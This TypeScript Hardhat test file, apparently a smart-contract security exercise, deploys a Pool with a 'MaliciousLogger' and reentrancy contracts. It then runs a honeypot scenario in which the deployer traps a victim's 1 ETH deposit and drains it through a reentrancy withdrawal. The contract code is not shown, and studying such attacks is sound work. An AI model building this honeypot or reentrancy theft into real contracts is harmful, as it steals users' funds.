import { ethers } from "hardhat"
import { assert, expect } from "chai"
import { Contract } from "ethers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"

describe("Tests for honeypot attack on Pool with PoolReentrancer", async () => {
  let accounts: SignerWithAddress[]
  let maliciousPool: Contract
  let reentrancer: Contract
  let reentrancer2: Contract

  beforeEach(async() => {
    const Reentrancer = await ethers.getContractFactory("PoolReentrancer")
    const MaliciousLogger = await ethers.getContractFactory("MaliciousLogger")
    const Pool = await ethers.getContractFactory("Pool")
    accounts = await ethers.getSigners()
    const maliciousLogger = await MaliciousLogger.deploy(accounts[0].address)
    maliciousPool = await Pool.deploy(maliciousLogger.address)
    reentrancer = await Reentrancer.deploy(accounts[0].address, maliciousPool.address)
    reentrancer2 = await Reentrancer.deploy(accounts[1].address, maliciousPool.address)
  })

  it("Should execute the honeypot attack", async () => {
    const balanceStart = await accounts[0].getBalance()
    const ether = ethers.utils.parseEther("1.0")
    // we deposit a trap of 3ETH to the pool through the reentrancer
    await reentrancer.connect(accounts[0]).depositFunds({value: ether.mul(3)})
    // accounts[1] deposits 1ETH through the reentrancer
    await reentrancer2.connect(accounts[1]).depositFunds({value: ether})
    // accounts[1] fails to withdraw funds as he is not accounts[0]
    const prms = reentrancer2.connect(accounts[1]).withdrawFunds()
    await expect(prms).to.revertedWith("Success required to change state!")
    // we do the reentrancy attack on the pool to get funds deposited by accounts[1]
    await reentrancer.connect(accounts[0]).withdrawFunds()
    const balanceEnd = await accounts[0].getBalance()
    console.log(balanceStart.div(ether).toString())
    console.log(balanceEnd.div(ether).toString())
    expect(balanceEnd.div(ether)).to.equal(balanceStart.div(ether).add(1))
  })
})